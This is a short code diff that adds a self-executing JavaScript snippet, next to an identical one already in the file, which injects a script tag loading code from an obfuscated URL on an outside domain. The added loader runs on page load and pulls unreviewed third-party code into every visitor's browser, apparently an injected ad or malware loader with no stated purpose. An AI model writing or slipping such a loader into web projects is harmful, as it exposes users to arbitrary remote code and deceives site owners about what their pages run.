@@ -250,4 +250,15 @@ s.async = true;
 s.referrerPolicy = 'no-referrer-when-downgrade';
 l.parentNode.insertBefore(s, l);
 })({})
+(function(vmqm){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = vmqm || {};
+s.src = "\/\/pricklyassociation.com\/b.XhV\/s\/dqGKlf0jYpWPcJ\/je\/mA9_uDZMUGl\/kBPGTScOwdNljhELyVO\/TfM-taN\/z\/AI2yMoTTIj5eNqwk";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+
 
